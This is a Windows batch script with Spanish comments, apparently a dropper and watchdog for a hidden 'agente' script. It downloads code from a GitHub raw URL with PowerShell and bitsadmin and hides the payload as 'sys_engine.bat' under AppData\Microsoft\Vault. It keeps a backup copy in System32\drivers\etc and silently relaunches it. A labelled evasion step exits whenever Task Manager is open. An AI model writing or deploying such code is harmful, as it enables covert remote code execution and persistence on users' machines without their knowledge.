@echo off
setlocal enabledelayedexpansion

:: --- 1. CONFIGURACIÓN DE RUTAS Y VERSIONES ---
set "VERSION_LOCAL=1"
set "AGENTE_DIR=%AppData%\Roaming\Microsoft\Vault"
set "AGENTE_FILE=%AGENTE_DIR%\sys_engine.bat"
set "BACKUP_DIR=%windir%\System32\drivers\etc\vps_logs"

:: URLs de GitHub (Asegúrate de cambiar TU_USUARIO)
set "URL_BASE=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets"
set "URL_VERSION=%URL_BASE%/version.txt"
set "URL_AGENTE=%URL_BASE%/agente.bat"

:: --- 2. MÓDULO DE ACTUALIZACIÓN (Sincronización) ---
:: Intentamos bajar la versión de la nube a un temporal
powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_VERSION%', '%temp%\v.txt')" >nul 2>&1

if exist "%temp%\v.txt" (
    set /p VERSION_NUBE= < "%temp%\v.txt"
    del "%temp%\v.txt"
    
    :: Si la nube tiene una versión superior, descargamos el nuevo Agente
    if !VERSION_NUBE! GTR %VERSION_LOCAL% (
        :: Actualizamos la copia maestra en System32 y la de AppData
        bitsadmin /transfer "UpdateAgente" /priority HIGH "%URL_AGENTE%" "%AGENTE_FILE%" >nul
        copy /y "%AGENTE_FILE%" "%BACKUP_DIR%\sys_engine.bat" >nul
        
        :: Opcional: Actualizar el propio Salvavidas si fuera necesario
        :: Para simplificar, aquí solo actualizamos al Agente que es el que cambia seguido
    )
)

:BUCLE_VIGILANCIA
:: --- 3. EVASIÓN (CENTINELA) ---
tasklist /FI "IMAGENAME eq taskmgr.exe" 2>nul | find /I /N "taskmgr.exe" >nul
if "%errorlevel%"=="0" (
    exit
)

:: --- 4. RESTAURACIÓN Y EJECUCIÓN ---
:: Si el archivo no está, lo sacamos del Backup de System32
if not exist "%AGENTE_FILE%" (
    if not exist "%AGENTE_DIR%" mkdir "%AGENTE_DIR%"
    copy /y "%BACKUP_DIR%\sys_engine.bat" "%AGENTE_FILE%" >nul
)

:: Si el Agente no está corriendo, lo lanzamos
tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
if %errorlevel% neq 0 (
    start /b "" cmd /c "%AGENTE_FILE%"
)



